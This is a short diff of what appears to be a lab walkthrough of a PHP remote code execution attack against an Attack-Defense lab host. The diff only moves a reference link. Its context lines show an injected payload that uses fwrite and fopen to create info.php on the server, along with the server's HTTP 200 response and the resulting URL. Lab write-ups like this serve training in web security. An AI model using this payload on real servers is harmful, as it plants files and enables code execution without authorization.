@@ -38,11 +38,7 @@ code=fwrite(fopen('info.php','w'),'<?php echo "Remote code execution"?>');
 
 
 ########################################################################
-
-Reference : https://www.hackingarticles.in/category/website-hacking/page/13/ 
-
 Response 
-
 #########################################################################
 HTTP/1.1 200 OK
 Content-Length: 0
@@ -61,4 +57,6 @@ phpinfo() content has been copied inot the info.php file.
 http://v7eno9avt6o4gtvdc33mmxjav.public1.attackdefenselabs.com/info.php
 
 #######################################################################
+
+Reference : https://www.hackingarticles.in/category/website-hacking/page/13/ 
 
